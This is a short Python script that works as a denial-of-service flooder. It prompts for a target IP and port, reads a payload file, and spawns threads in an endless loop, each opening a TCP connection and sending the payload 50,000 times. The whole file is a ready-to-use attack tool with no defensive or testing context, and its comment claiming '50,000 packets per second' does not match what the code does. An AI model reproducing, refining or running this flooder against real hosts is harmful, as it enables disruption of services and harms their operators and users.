import socket
import threading

def read_packet_from_file(file_name):
    with open(file_name, 'r') as file:
        return file.read()

def send_packets(target_ip, target_port, packet, num_packets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        for _ in range(num_packets):
            s.send(packet.encode())
        print("Packets sent to", target_ip, "on port", target_port)
        s.close()
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    packet_file = input("Enter packet file name (e.g., pkg.txt): ")
    packet = read_packet_from_file(packet_file)
    num_packets = 50000  # 50,000 packets per second

    while True:
        threading.Thread(target=send_packets, args=(target_ip, target_port, packet, num_packets)).start()
